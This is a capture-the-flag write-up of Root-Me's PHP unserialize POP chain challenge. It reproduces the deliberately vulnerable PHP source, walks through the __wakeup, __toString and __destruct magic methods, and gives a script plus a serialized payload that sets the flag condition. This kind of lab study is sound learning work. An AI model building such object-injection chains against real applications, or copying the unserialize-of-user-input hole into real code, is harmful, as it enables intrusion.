---
title: "Rootme CTF - POP chain"
tags:
  - PHP sec
  - code Review
  - web
  - CTF 
---
# Some POP Chains in PHP

### 1. Rootme: PHP - Unserialize Pop Chain.

The question gives the source code and here is what to look for:

```php
<?php

$getflag = false;

class GetMessage {
    function __construct($receive) {
        if ($receive === "HelloBooooooy") {
            die("[FRIEND]: Ahahah you get fooled by my security my friend!<br>");
        } else {
            $this->receive = $receive;
        }
    }

    function __toString() {
        return $this->receive;
    }

    function __destruct() {
        global $getflag;
        if ($this->receive !== "HelloBooooooy") {
            die("[FRIEND]: Hm.. you don't see to be the friend I was waiting for..<br>");
        } else {
            if ($getflag) {
                include("flag.php");
                echo "[FRIEND]: Oh ! Hi! Let me show you my secret: ".$FLAG . "<br>";
            }
        }
    }
}

class WakyWaky {
    function __wakeup() {
        echo "[YOU]: ".$this->msg."<br>";
    }

    function __toString() {
        global $getflag;
        $getflag = true;
        return (new GetMessage($this->msg))->receive;
    }
}

if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    die();
}

if (isset($_POST["data"]) && !empty($_POST["data"])) {
    unserialize($_POST["data"]);
}

?>

```

### Analysis:

The post takes in the parameter data via the POST method and unserializes it. There are 2 classes: `GetMessage` and `WakyWaky`. The flag will be retrieved in the magic method of the class `GetMessage::__destruct()`.

```php
phpCopy code
if ($getflag) {
    include("flag.php");
    echo "[FRIEND]: Oh ! Hi! Let me show you my secret: ".$FLAG . "<br>";
}

```

So the condition to get the flag is:

1. `__destruct()` executed: this is a magic method in PHP that will be executed when the object is destroyed or the program ends (not executed when the program ends by the `die()`).
2. The value `receive` of the object given by the class `GetMessage` is "HelloBooooooy".
3. `$getflag` has the value `true`.

### Practice:

The first thing to do is to avoid the appearance of the function `__destruct()`. We see in the class `GetMessage`:

```php
function __construct($receive) {
    if ($receive === "HelloBooooooy") {
        die("[FRIEND]: Ahahah you get fooled by my security my friend!<br>");
    } else {
        $this->receive = $receive;
    }
}

```

This is a magic method that executes when the object is initialized. However, if the initialization always assigns `$receive` a value of "HelloBooooooy", it will be false because it executes `die()`, so it needs to be assigned after initialization and the method `__toString()` in the class `WakyWaky` must be executed because it can do this:

```php
return (new GetMessage($this->msg))->receive;

```

Continue to set the `$getflag` variable to `true` as we see in the class `WakyWaky`:

```php
function __toString() {
    global $getflag;
    $getflag = true;
    return (new GetMessage($this->msg))->receive;
}

```

`__toString()` is a magic method that is executed when an object created by that class is used as a string. For example: `echo`, `print`, `preg_match()`, …

Notice that in the same class there is:

```php
function __wakeup() {
    echo "[YOU]: ".$this->msg."<br>";
}

```

When `$this->msg` is an object of a class `WakyWaky`, that object will execute `__toString()`. So to execute `__wakeup()` is fine, this is also a magic method executed when the object is unserialized => The object needs to be passed into the constructor `unserialize()` by the class `WakyWaky`.

### Script Summary:

```php
<?php
$getflag = false;
class GetMessage
{
    public $receive;
}
class WakyWaky
{
    public $msg;
    function __construct($msg)
    {
        $this->msg = $msg;
    }
}
$a = new GetMessage('');
$a->receive = 'HelloBooooooy';

$b1 = new WakyWaky($a);
$b2 = new WakyWaky($b1);
echo serialize($b2);

```

### Payload:

```css
O:8:"WakyWaky":1:{s:3:"msg";O:8:"WakyWaky":1:{s:3:"msg";O:10:"GetMessage":1:{s:7:"receive";s:13:"HelloBooooooy";}}}

```